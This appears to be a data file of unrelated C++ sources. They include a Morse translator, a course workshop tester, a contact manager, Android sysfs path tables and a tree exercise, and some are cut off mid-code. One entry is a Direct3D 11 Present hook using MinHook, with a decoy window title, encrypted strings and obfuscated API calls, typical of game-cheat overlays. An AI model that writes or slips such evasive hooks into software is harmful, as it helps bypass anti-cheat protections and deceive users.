    "//\u6469\u65af\u7535\u7801\u7ffb\u8bd1\u5668 \u6218\u5730\u4e00\u7ef4\u548c\u8005\u5f69\u86cb 2024.9.15\r\n\r\n#include<iostream>\r\n#include<vector>\r\n#include<string>\r\n#include<cstring>//\u8fd9\u4e2a\u5934\u6587\u4ef6\u63d0\u4f9b\u4e86\u7528\u4e8e\u5904\u7406 C \u98ce\u683c\u5b57\u7b26\u4e32\uff08\u5373\u4ee5\u7a7a\u5b57\u7b26 '\\0' \u7ed3\u5c3e\u7684\u5b57\u7b26\u6570\u7ec4\uff09\u7684\u51fd\u6570\r\nusing namespace std;\r\n\r\nvoid insp(vector<char>& ch);    //\u8f93\u5165 (\u7a7a\u683c)\r\nvoid insl(string& str);        //\u8f93\u5165 (\u659c\u6760 /)\r\nvoid inpup(vector<string>& ch); //\u8f93\u5165 (\u82f1\u8bed-->\u6469\u65af)\r\n\r\n\r\nvoid show(vector<char>& arr);   //\u8f93\u51fa (\u7a7a\u683c)\r\nvoid showout(vector<string>& arr); //\u8f93\u51fa (\u82f1\u8bed-->\u6469\u65af)\r\n\r\nint main()\r\n{\r\n\tvector<char> sp;    //\u6469\u65af\uff08\u7a7a\u683c\uff09  Spacekey\r\n\tstring sl;          //\u6469\u65af\uff08\u659c\u6760 /\uff09Slash\r\n\tvector <string> cd; //\u82f1\u8bed-->\u6469\u65af\uff08\u5b57\u6bcd\u4e32\uff09\r\n\r\n\tint op;\r\n\twhile (1)\r\n\t{\r\n\t\tcout << \"*****************************************\" <<endl;\r\n\t\tcout << \"\u5bf9\u5e94\u529f\u80fd: \\n1.\u6469\u65af\u7535\u7801-->\u82f1\u8bed(\u7a7a\u683c\u9694\u5f00)\\n2.\u6469\u65af\u7535\u7801-->\u82f1\u8bed( / \u9694\u5f00)\\n3.\u82f1\u8bed-->\u6469\u65af\u7535\u7801\uff1a\\n\";\r\n\t\tcout << \"*****************************************\" <<endl;\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u5bf9\u5e94\u529f\u80fd\u6570\u5b57:\" << endl;\r\n\t\tcin >> op;\r\n\t\tsystem(\"pause\");//\u6309\u4efb\u610f\u952e\u7ee7\u7eed\uff0c\u4e0d\u6d88\u5931\r\n\t\tsystem(\"cls\");//\u6e05\u5c4f\uff0c\u9632\u6b62 \u4e3b\u83dc\u5355\u8fde\u7eed\u51fa\u73b0\r\n\t\tif (op == 1)\r\n\t\t\tinsp(sp);\r\n\t\telse if (op == 2)\r\n\t\t{\r\n\t\t\tcout << \"\u8bf7\u8f93\u5165\u60a8\u8981\u8f6c\u6362\u7684\u7535\u7801(\u6bcf\u6bb5\u7528/\u9694\u5f00,\u8f93\u5165\u5b8c\u6210\u6309\u56de\u8f66)\" << endl;\r\n\t\t\tcin >> sl;\r\n\t\t\tinsl(sl);  //\u8c03\u7528\u8f93\u5165\u51fd\u6570\uff08\u659c\u6760/ \uff09\r\n\t\t\tcout<< endl;\r\n\t\t}\r\n\t\telse if (op == 3)\r\n\t\t\tinpup(cd);\r\n\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"\u3010\u6307\u4ee4\u9519\u8bef\u3011\u8bf7\u57281\u30012\u30013\u4e2d\u9009\u62e9\" << endl;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tsl.clear();\r\n\t\tcd.clear();\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\n\r\nvoid insp(vector<char>& ch)   //\u8f93\u5165\u51fd\u6570\uff08\u7a7a\u683c\uff09\r\n{\r\n\tcout << \"\u8bf7\u8f93\u5165\u6469\u65af\u7535\u7801(\u6bcf\u6bb5\u7535\u7801\u8bf7\u7528\u7a7a\u683c\u9694\u5f00,\u8f93\u5165\u201c\uff08\u7a7a\u683c\uff09end\u201d\u7ed3\u675f \uff1b):\\n\";\r\n\tstring str = \"\";\r\n\tint bol = 0;\r\n\tstring strend = \"end\";\r\n\twhile (str != strend)\r\n\t{\r\n\t\tcin >> str;\r\n\t\tif (str == \".-\")\r\n\t\t\tch.push_back('a');\r\n\t\telse if (str == \"-...\")\r\n\t\t\tch.push_back('b');\r\n\t\telse if (str == \"-.-.\")\r\n\t\t\tch.push_back('c');\r\n\t\telse if (str == \"-..\")\r\n\t\t\tch.push_back('d');\r\n\t\telse if (str == \".\")\r\n\t\t\tch.push_back('e');\r\n\t\telse if (str == \"..-.\")\r\n\t\t\tch.push_back('f');\r\n\t\telse if (str == \"--.\")\r\n\t\t\tch.push_back('g');\r\n\t\telse if (str == \"....\")\r\n\t\t\tch.push_back('h');\r\n\t\telse if (str == \"..\")\r\n\t\t\tch.push_back('i');\r\n\t\telse if (str == \".---\")\r\n\t\t\tch.push_back('j');\r\n\t\telse if (str == \"-.-\")\r\n\t\t\tch.push_back('k');\r\n\t\telse if (str == \".-..\")\r\n\t\t\tch.push_back('l');\r\n\t\telse if (str == \"--\")\r\n\t\t\tch.push_back('m');\r\n\t\telse if (str == \"-.\")\r\n\t\t\tch.push_back('n');\r\n\t\telse if (str == \"---\")\r\n\t\t\tch.push_back('o');\r\n\t\telse if (str == \".--.\")\r\n\t\t\tch.push_back('p');\r\n\t\telse if (str == \"--.-\")\r\n\t\t\tch.push_back('q');\r\n\t\telse if (str == \".-.\")\r\n\t\t\tch.push_back('r');\r\n\t\telse if (str == \"...\")\r\n\t\t\tch.push_back('s');\r\n\t\telse if (str == \"-\")\r\n\t\t\tch.push_back('t');\r\n\t\telse if (str == \"..-\")\r\n\t\t\tch.push_back('u');\r\n\t\telse if (str == \"...-\")\r\n\t\t\tch.push_back('v');\r\n\t\telse if (str == \".--\")\r\n\t\t\tch.push_back('w');\r\n\t\telse if (str == \"-..-\")\r\n\t\t\tch.push_back('x');\r\n\t\telse if (str == \"-.--\")\r\n\t\t\tch.push_back('y');\r\n\t\telse if (str == \"--..\")\r\n\t\t\tch.push_back('z');\r\n\t\telse if (str == \".----\")\r\n\t\t\tch.push_back('1');\r\n\t\telse if (str == \"..---\")\r\n\t\t\tch.push_back('2');\r\n\t\telse if (str == \"...--\")\r\n\t\t\tch.push_back('3');\r\n\t\telse if (str == \"....-\")\r\n\t\t\tch.push_back('4');\r\n\t\telse if (str == \".....\")\r\n\t\t\tch.push_back('5');\r\n\t\telse if (str == \"-....\")\r\n\t\t\tch.push_back('6');\r\n\t\telse if (str == \"--...\")\r\n\t\t\tch.push_back('7');\r\n\t\telse if (str == \"---..\")\r\n\t\t\tch.push_back('8');\r\n\t\telse if (str == \"----.\")\r\n\t\t\tch.push_back('9');\r\n\t\telse if (str == \"-----\")\r\n\t\t\tch.push_back('0');\r\n\t\telse if (str == \"..--..\")\r\n\t\t\tch.push_back('?');\r\n\t\telse if (str == \"-..-.\")\r\n\t\t\tch.push_back('/');\r\n\t\telse if (str == \"-....-\")\r\n\t\t\tch.push_back('-');\r\n\t\telse if (str == \".-.-.-\")\r\n\t\t\tch.push_back('.');\r\n\t\telse if (str == \"-.--.-\")\r\n\t\t{\r\n\t\t\tif (bol == 0)\r\n\t\t\t{\r\n\t\t\t\tch.push_back('(');\r\n\t\t\t\tbol = 1;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tch.push_back(')');\r\n\t\t\t\tbol = 0;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (str == strend)\r\n\t\t\tshow(ch);\r\n\t}\r\n}\r\n\r\nvoid insl(string& str)  //\u8f93\u5165\u51fd\u6570\uff08 \u659c\u6760/ \uff09\r\n{\r\n\tunsigned int s1 = 0, s2 = 0, index = 0;\r\n\tchar x = 0;\r\n\tint bol = 0;\r\n\tunsigned int end = str.size();\r\n\tstring temp = \"\";\r\n\twhile (index < end)\r\n\t{\r\n\t\ts1 = index;\r\n\t\twhile (index < end && str[index] != '/')\r\n\t\t{\r\n\t\t\tindex++;\r\n\t\t}\r\n\t\ts2 = index;\r\n\t\ttemp = str.substr(s1, s2 - s1);\r\n\t\tif (temp == \".-\")\r\n\t\t\tcout << 'a';\r\n\t\telse if (temp == \"-...\")\r\n\t\t\tcout << 'b';\r\n\t\telse if (temp == \"-.-.\")\r\n\t\t\tcout << 'c';\r\n\t\telse if (temp == \"-..\")\r\n\t\t\tcout << 'd';\r\n\t\telse if (temp == \".\")\r\n\t\t\tcout << 'e';\r\n\t\telse if (temp == \"..-.\")\r\n\t\t\tcout << 'f';\r\n\t\telse if (temp == \"--.\")\r\n\t\t\tcout << 'g';\r\n\t\telse if (temp == \"....\")\r\n\t\t\tcout << 'h';\r\n\t\telse if (temp == \"..\")\r\n\t\t\tcout << 'i';\r\n\t\telse if (temp == \".---\")\r\n\t\t\tcout << 'j';\r\n\t\telse if (temp == \"-.-\")\r\n\t\t\tcout << 'k';\r\n\t\telse if (temp == \".-..\")\r\n\t\t\tcout << 'l';\r\n\t\telse if (temp == \"--\")\r\n\t\t\tcout << 'm';\r\n\t\telse if (temp == \"-.\")\r\n\t\t\tcout << 'n';\r\n\t\telse if (temp == \"---\")\r\n\t\t\tcout << 'o';\r\n\t\telse if (temp == \".--.\")\r\n\t\t\tcout << 'p';\r\n\t\telse if (temp == \"--.-\")\r\n\t\t\tcout << 'q';\r\n\t\telse if (temp == \".-.\")\r\n\t\t\tcout << 'r';\r\n\t\telse if (temp == \"...\")\r\n\t\t\tcout << 's';\r\n\t\telse if (temp == \"-\")\r\n\t\t\tcout << 't';\r\n\t\telse if (temp == \"..-\")\r\n\t\t\tcout << 'u';\r\n\t\telse if (temp == \"...-\")\r\n\t\t\tcout << 'v';\r\n\t\telse if (temp == \".--\")\r\n\t\t\tcout << 'w';\r\n\t\telse if (temp == \"-..-\")\r\n\t\t\tcout << 'x';\r\n\t\tel",
    "/***********************************************************************\r\n// OOP244 Workshop #03 p1: tester program\r\n//\r\n// File\tmain.cpp\r\n// Version 1.0\r\n// Date: September 28, 2023\r\n// Author: Yosef Ashibani, Fardad Soleimanloo\r\n// Description\r\n//\r\n// Revision History\r\n// -----------------------------------------------------------\r\n// Name            Date            Reason\r\n//\r\n/////////////////////////////////////////////////////////////////\r\n***********************************************************************/\r\n\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#include <iostream>\r\n#include \"Customer.h\"\r\n#include \"Car.h\"\r\n\r\nusing namespace std;\r\nusing namespace seneca;\r\n\r\nvoid serviceReport(Customer& customer) {\r\n   cout << \"Servide Report - ..........................................\" << endl;\r\n   if (!customer.isEmpty() && !customer.car().isEmpty()) {\r\n      cout << \"Customer Details:\" << endl;\r\n      customer.display();\r\n   }\r\n   else {\r\n      cout << \"Missing information.......................incomplete Entry:\" << endl;\r\n      if (customer.isEmpty()) {\r\n         cout << \"                   Customer infomration is missing.\" << endl;\r\n      }\r\n      if (!customer.isEmpty() && customer.car().isEmpty()) {\r\n         cout << \"                   Car information is missing.\" << endl;\r\n      }\r\n   }\r\n}\r\n\r\nint main() {\r\n   const int numOfCustomers = 5;\r\n\r\n   Car cars[numOfCustomers+1];\r\n   Customer customers[numOfCustomers];\r\n   for (int i = 0; i < numOfCustomers; i++) {\r\n      cars[i].setEmpty();\r\n      customers[i].setEmpty();\r\n   }\r\n   cars[numOfCustomers].setEmpty();\r\n\r\n   cars[0].set(\"ABC123\", nullptr, \"Engine oil change\", 50.0);// invalid\r\n   cars[1].set(\"ABC1234\", \"Toyota Camry\", nullptr, 50.0);    // invalid\r\n   cars[2].set(\"DEFG1234\", \"\", \"Air filter change\", 9.0);    // invalid\r\n   cars[3].set(\"ABC\", \"Toyota Camry\", \"\", 50.0);             // invalid\r\n   cars[4].set(\"ABC\", \"Toyota Camry\", \"Engine oil change\", 50.0);  // valid\r\n\r\n   for (int i = 0; i < numOfCustomers + 1; i++) {\r\n      cout << '[' << i << \"] +++++++++++++\" << endl;\r\n      cars[i].display();\r\n      cout << \"-----------------\" << endl;\r\n   }\r\n\r\n   customers[0].set(1001, \"John Carter\", nullptr);\r\n   customers[1].set(1002, nullptr, &cars[1]);\r\n   customers[2].set(1003, \"\", &cars[2]);\r\n   customers[3].set(1004, \"Bob Johnson\", &cars[3]);\r\n   customers[4].set(1005, \"Jane Smith\", &cars[4]);\r\n\r\n   for (int i = 0; i < numOfCustomers; i++) {\r\n      serviceReport(customers[i]);\r\n      cars[i].deallocateMemory();\r\n      customers[i].deallocateMemory();\r\n   }\r\n   cars[numOfCustomers].deallocateMemory();\r\n   return 0;\r\n}\r\n\r\n\r\n\r\n",
    "// including header files\n#include<iostream>\n#include<conio.h>\n#include<fstream>\nusing namespace std;\n\n//global variables\nstring fname,lname,phone_num;\n\n// Functions\nvoid addContact();\nvoid searchContact();\nvoid help();\nvoid self_exit();\nbool check_digits(string);\nbool check_numbers(string);\n\nint main()\n{\n    short int choice;\n    system(\"cls\");\n    system(\"color 0A\");\n    cout << \"\\n\\n\\n\\t\\t\\tContact Management.\";\n    cout << \"\\n\\n\\t1. Add Contact\\n\\t2. Search Contact\\n\\t3. Help\\n\\t4. Exit\\n\\t> \";\n    cin >> choice;\n\n    switch(choice)\n    {\n        case 1:\n            addContact();\n            break;\n        case 2:\n            searchContact();\n            break;\n        case 3:\n            help();\n            break;\n        case 4:\n            self_exit();\n            break;\n        default:\n            cout << \"\\n\\n\\tInvalid Input !\";\n            cout << \"\\n\\tPress Any Key To Continue..\";\n            getch();\n            main();\n    }\n    return 0;\n}\n\nvoid self_exit()\n{\n    system(\"cls\");\n    cout << \"\\n\\n\\n\\t\\tThank You For Using !\";\n    exit(1);\n}\n\nvoid help()\n{\n    cout << \"This displays help\";\n}\n\nvoid addContact()\n{\n    ofstream phone(\"number.txt\", ios::app);\n    system(\"cls\");\n    cout << \"\\n\\n\\tEnter First Name : \";\n    cin >> fname;\n    cout << \"\\n\\tEnter Last Name : \";\n    cin >> lname;\n    cout << \"\\n\\tEnter 10-Digit Phone Number : \";\n    cin >> phone_num;\n\n    if(check_digits(phone_num) == true)\n    {\n        if(check_numbers(phone_num) == true)\n        {\n            if(phone.is_open())\n            {\n                phone << fname << \" \" << lname << \" \" << phone_num << endl;\n                cout << \"\\n\\tContact Saved Successfully !\";\n            }\n            else\n            {\n                cout << \"\\n\\tError Opening File !\";\n            }\n        }\n        else\n        {\n            cout << \"\\n\\tA Phone Number Must Contain Numbers Only !\";\n        }\n    }\n    else\n    {\n        cout << \"\\n\\tA Phone Number Must COntain 10 Digits.\";\n    }\n    phone.close();\n}\n\nvoid searchContact()\n{\n    bool found = false;\n    ifstream myfile(\"number.txt\");\n    string keyword;\n    cout << \"\\n\\tEnter Name To Search : \";\n    cin >> keyword;\n    while(myfile >> fname >> lname >> phone_num)\n    {\n        if(keyword == fname || keyword == lname)\n        {\n            system(\"cls\");\n            cout << \"\\n\\n\\n\\t\\tContact details..\";\n            cout << \"\\n\\n\\tFirst Name : \" << fname;\n            cout << \"\\n\\tLast Name : \" << lname;\n            cout << \"\\n\\tPhone Number : \" << phone_num;\n            found = true;\n            break;\n        }\n    }\n    if(found == false)\n    cout << \"\\n\\tNo Such Contact Found\";\n}\n\nbool check_digits(string x)\n{\n    if(x.length() == 10)\n    return true;\n    else\n    return false;\n}\n\nbool check_numbers(string x)\n{\n    bool check = true;\n\n    for(int i=0; i < x.length(); i++)\n    {\n        if(!(int(x[i]) >= 48 && int(x[i]) <= 57))\n        {\n            check = false;\n            break;\n        }\n    }\n\n    if(check == true)\n    return true;\n    if(check == false)\n    return false;\n}\n",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"pixelstats\"\n\n#include <android-base/logging.h>\n#include <pixelstats/SysfsCollector.h>\n#include <pixelstats/UeventListener.h>\n\n#include <thread>\n\n#include <pixelstats/SysfsCollector.h>\n#include <pixelstats/UeventListener.h>\n\nusing android::hardware::google::pixel::SysfsCollector;\nusing android::hardware::google::pixel::UeventListener;\n\n#define UFSHC_PATH(filename) \"/dev/sys/block/bootdevice/\" #filename\n#define UFS_ERR_PATH(err_type) UFSHC_PATH(err_stats/) #err_type\nconst struct SysfsCollector::SysfsPaths sysfs_paths = {\n    .SlowioReadCntPath = UFSHC_PATH(slowio_read_cnt),\n    .SlowioWriteCntPath = UFSHC_PATH(slowio_write_cnt),\n    .SlowioUnmapCntPath = UFSHC_PATH(slowio_unmap_cnt),\n    .SlowioSyncCntPath = UFSHC_PATH(slowio_sync_cnt),\n    .CycleCountBinsPath = \"/sys/class/power_supply/battery/cycle_counts\",\n    .UFSLifetimeA = UFSHC_PATH(health_descriptor/life_time_estimation_a),\n    .UFSLifetimeB = UFSHC_PATH(health_descriptor/life_time_estimation_b),\n    .UFSLifetimeC = UFSHC_PATH(health_descriptor/life_time_estimation_c),\n    .F2fsStatsPath = \"/sys/fs/f2fs/\",\n    .ImpedancePath = \"/sys/devices/platform/audiometrics/speaker_impedance\",\n    .CodecPath =     \"/sys/devices/platform/audiometrics/codec_state\",\n    .EEPROMPath = \"/dev/battery_history\",\n    .MitigationPath = \"/sys/devices/virtual/pmic/mitigation\",\n    .BrownoutReasonProp = \"vendor.brownout_reason\",\n    .BrownoutCsvPath = \"/data/vendor/mitigation/lastmeal.csv\",\n    .BrownoutLogPath = \"/data/vendor/mitigation/lastmeal.txt\",\n    .SpeakerTemperaturePath = \"/sys/devices/platform/audiometrics/speaker_temp\",\n    .SpeakerExcursionPath = \"/sys/devices/platform/audiometrics/speaker_excursion\",\n    .SpeakerHeartBeatPath = \"/sys/devices/platform/audiometrics/speaker_heartbeat\",\n    .UFSErrStatsPath = {\n        UFS_ERR_PATH(pa_err_count),\n        UFS_ERR_PATH(dl_err_count),\n        UFS_ERR_PATH(nl_err_count),\n        UFS_ERR_PATH(tl_err_count),\n        UFS_ERR_PATH(dme_err_count),\n        UFS_ERR_PATH(fatal_err_count),\n        UFS_ERR_PATH(auto_hibern8_err_count)\n    },\n    .AmsRatePath = \"/sys/devices/platform/audiometrics/ams_rate_read_once\",\n    .ResumeLatencyMetricsPath = \"/sys/kernel/metrics/resume_latency/resume_latency_metrics\",\n    .LongIRQMetricsPath = \"/sys/kernel/metrics/irq/long_irq_metrics\",\n    .StormIRQMetricsPath = \"/sys/kernel/metrics/irq/storm_irq_metrics\",\n    .IRQStatsResetPath = \"/sys/kernel/metrics/irq/stats_reset\",\n    .ThermalStatsPaths = {\n        \"/sys/devices/platform/100a0000.BIG/trip_counter\",\n        \"/sys/devices/platform/100a0000.MID/trip_counter\",\n        \"/sys/devices/platform/100a0000.LITTLE/trip_counter\",\n        \"/sys/devices/platform/100b0000.G3D/trip_counter\",\n        \"/sys/devices/platform/100b0000.TPU/trip_counter\",\n        \"/sys/devices/platform/100b0000.AUR/trip_counter\",\n    },\n    .TempResidencyAndResetPaths = {\n        {\n            \"/sys/kernel/metrics/thermal/tr_by_group/tmu/stats\",\n            \"/sys/kernel/metrics/thermal/tr_by_group/tmu/stats_reset\"\n        },\n        {\n            \"/sys/kernel/metrics/thermal/tr_by_group/spmic/stats\",\n            \"/sys/kernel/metrics/thermal/tr_by_group/spmic/stats_reset\"\n        }\n    },\n    .ModemPcieLinkStatsPath = \"/sys/devices/platform/12100000.pcie/link_stats\",\n    .WifiPcieLinkStatsPath = \"/sys/devices/platform/13120000.pcie/link_stats\",\n    .GMSRPath = {\n        \"/sys/class/power_supply/max77779fg/gmsr\",\n        \"/sys/class/power_supply/maxfg_base/gmsr\",\n    },\n    .FGModelLoadingPath = {\n        \"/sys/class/power_supply/max77779fg/model_state\",\n        \"/sys/class/power_supply/maxfg_base/model_state\"\n    },\n    .FGLogBufferPath = {\n        \"/dev/logbuffer_maxfg_monitor\",\n        \"/dev/logbuffer_max77779fg_monitor\",\n        \"/dev/logbuffer_maxfg_base_monitor\",\n        \"/dev/logbuffer_maxfg_secondary_monitor\"\n    },\n    .PDMStatePath = \"/sys/devices/platform/audiometrics/pdm_state\",\n    .WavesPath = \"/sys/devices/platform/audiometrics/waves\",\n    .AdaptedInfoCountPath = \"/sys/devices/platform/audiometrics/adapted_info_active_count\",\n    .AdaptedInfoDurationPath = \"/sys/devices/platform/audiometrics/adapted_info_active_duration\",\n    .CCARatePath = \"/sys/devices/platform/audiometrics/cca_count_read_once\",\n    .PcmLatencyPath = \"/sys/devices/platform/audiometrics/pcm_latency\",\n    .PcmCountPath = \"/sys/devices/platform/audiometrics/pcm_count\",\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include <iostream>\r\n#include <math.h>\r\nenum STATUS{OK,ERROR,WARN};\r\nusing namespace std;\r\n//\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u987a\u5e8f\u8868\u8868\u793a\u65b9\u6cd5\r\ntemplate<typename T>\r\nclass TwoForkTreeNode{\r\npublic:\r\n\tTwoForkTreeNode():flag('^'){}\r\n\tTwoForkTreeNode(T val):data(val),flag('^'){}\r\n\tT data;\r\n\tchar flag;\r\n};\r\ntemplate<typename T>\r\nclass TwoForkTreeOrder{\r\npublic:\r\n\tTwoForkTreeOrder(T val,int dep):depth(dep),curentPos(1){\r\n\t\ttree=new TwoForkTreeNode<T>[1<<dep];\r\n\t\ttree[0]=TwoForkTreeNode<T>(val);\r\n\t\ttree[0].flag='&';\r\n\t\tfor(int i=1;i<1<<dep;i++){\r\n\t\t\ttree[i]=TwoForkTreeNode<T>();\r\n\t\t}\r\n\t}\r\n\tTwoForkTreeNode<T> *tree;\r\n\tint depth;\r\n\tint curentPos;\r\n\t~TwoForkTreeOrder(){\r\n\t\tdelete[] tree;\r\n\t}\r\n};\r\ntemplate<typename T>\r\nbool isMax(TwoForkTreeOrder<T> &tree){\r\n\treturn tree.tree[1<<tree.depth-1]!='^';\r\n}\r\ntemplate<typename T>\r\nbool isEmpty(TwoForkTreeOrder<T> &tree){\r\n\treturn tree.tree[1].flag=='^';\r\n}\r\n//\u5411\u6811\u4e2d\u5b58\u5165\u6570\u636e\r\ntemplate<typename T>\r\nSTATUS pushElemToTree(T val,TwoForkTreeOrder<T> &tree){\r\n\tif(isMax(tree)){\r\n\t\tcout<<\"\u6570\u7ec4\u5df2\u6ee1\"<<endl;\r\n\t\treturn ERROR;\r\n\t}\r\n\ttree.tree[tree.curentPos].data=val;\r\n\ttree.tree[tree.curentPos].flag='&';\r\n\ttree.curentPos++;\r\n\treturn OK;\r\n}\r\n//\u53d6\u51fa\u6811\u4e2d\u7684\u6570\u636e \u4e24\u79cd\u65b9\u5f0f\r\n//\u6ce8\u610fdepth\u662f\u4ece0\u5f00\u59cb\u7684\r\n//pos\u4ece1\u5f00\u59cb\r\ntemplate<typename T>\r\nSTATUS getElemRowCol(int depth,int pos,TwoForkTreeOrder<T> &tree,T &ReturnElem){\r\n\tint temp_depth=depth+1;\r\n\tif(temp_depth<1||temp_depth>tree.depth){\r\n\t\tcout<<\"\u8d85\u51fa\u6811\u6df1\u5ea6\"<<endl;\r\n\t\treturn ERROR;\r\n\t}\r\n\tint temp_pos=pow(2,depth);\r\n\tif(pos<1||pos>temp_pos){\r\n\t\tcout<<\"\u65e0\u6cd5\u8bbf\u95ee\uff0c\u8d85\u51fa\u5f53\u524d\u6df1\u5ea6\u7684\u6700\u591a\u5143\u7d20\"<<endl;\r\n\t\treturn ERROR;\r\n\t}\r\n\t\r\n\tint GetPos=pow(2,depth)+pos;\r\n\tReturnElem=tree.tree[GetPos].data;\r\n\treturn OK;\r\n}\r\n\r\ntemplate<typename T>\r\nSTATUS getElem(int pos,T &e,TwoForkTreeOrder<T> &tree){\r\n\tint 